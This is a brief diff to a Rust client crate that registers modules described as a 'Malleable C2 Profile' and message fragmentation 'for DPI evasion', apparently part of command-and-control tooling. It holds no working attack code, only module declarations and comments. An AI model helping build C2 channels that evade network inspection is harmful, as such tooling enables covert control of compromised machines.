@@ -6,6 +6,15 @@
 use crate::error::{ClientError, Result};
 use async_trait::async_trait;
 
+// 🛡️ Phase 3: Malleable C2 Profile — customizable HTTP headers/UA
+pub mod profile;
+
+// 🛡️ Phase 2: Message Fragmentation — split large payloads for DPI evasion
+pub mod fragment;
+
+// Session-key seal/open + fragment reassembly (Noise-aware)
+pub mod session_crypto;
+
 // 条件编译：仅在启用 ws 特性时包含 WebSocket 模块
 #[cfg(feature = "ws")]
 pub mod ws;
